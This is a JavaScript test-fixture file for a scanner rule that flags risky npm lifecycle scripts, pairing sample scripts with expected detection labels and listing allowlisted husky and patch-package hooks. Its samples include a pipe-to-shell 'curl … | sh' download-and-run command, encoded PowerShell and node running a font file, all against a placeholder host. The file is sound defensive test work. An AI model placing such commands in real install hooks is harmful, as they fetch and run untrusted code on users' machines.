// In-memory package.json fixtures for the lifecycle rule. Hosts use example.invalid only.
export const pkg = (scripts) => JSON.stringify({ name: 'fixture', version: '1.0.0', scripts }, null, 2) + '\n';

export const HIGH_CASES = [
  ['pipe-to-shell', 'curl -s https://example.invalid/i | sh', ['pipe-to-shell', 'curl-wget']],
  ['node-eval', 'node -e "console.log(1)"', ['node-eval']],
  ['node-eval-long', 'node --eval "console.log(1)"', ['node-eval']],
  ['base64', 'echo aGVsbG8= | base64 -d', ['base64']],
  ['powershell-enc', 'powershell -enc AAAA', ['powershell-encoded']],
  ['powershell-encodedcommand', 'powershell -EncodedCommand AAAA', ['powershell-encoded']],
  ['node-nonjs-file', 'node ./assets/font.woff2', ['node-nonjs-file']],
  ['wget', 'wget https://example.invalid/x', ['curl-wget']],
  ['invoke-webrequest', 'Invoke-WebRequest https://example.invalid/x', ['web-request-cmdlet']],
  ['iwr', 'iwr https://example.invalid/x', ['web-request-cmdlet']],
];

export const ALLOWLISTED = [
  ['prepare', 'husky'],
  ['prepare', 'husky install'],
  ['prepare', 'is-ci || husky install'],
  ['postinstall', 'patch-package'],
  ['postinstall', 'npx   patch-package'],
];
